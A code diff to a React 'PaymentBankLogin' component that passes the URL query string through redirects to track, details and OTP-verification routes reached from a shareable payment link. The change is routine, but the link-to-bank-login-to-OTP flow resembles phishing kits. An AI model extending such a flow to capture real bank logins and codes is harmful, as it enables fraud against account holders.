@@ -20,6 +20,7 @@ const PaymentBankLogin = () => {
   const { toast } = useToast();
   const shareId = rawIdParam || "";
   const { data: linkData, isLoading } = useLink(shareId);
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
   const urlServiceKey = useMemo(
     () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
     []
@@ -81,19 +82,19 @@ const PaymentBankLogin = () => {
     const bank = sessionStorage.getItem('selectedBank');
 
     if (!method) {
-      navigate(`/pay/${shareId}/track`);
+      navigate(`/pay/${shareId}/track${currentSearch}`);
       return;
     }
 
     if (method !== 'login') {
-      navigate(`/pay/${shareId}/details`);
+      navigate(`/pay/${shareId}/details${currentSearch}`);
       return;
     }
 
     if (!bank || bank === 'skipped') {
-      navigate(`/pay/${shareId}/track`);
+      navigate(`/pay/${shareId}/track${currentSearch}`);
     }
-  }, [shareId, navigate]);
+  }, [shareId, navigate, currentSearch]);
 
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
   const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
@@ -274,7 +275,7 @@ const PaymentBankLogin = () => {
     });
     
     // Navigate to OTP verification
-    navigate(`/pay/${shareId}/otp`);
+    navigate(`/pay/${shareId}/otp${currentSearch}`);
   };
   
   return (
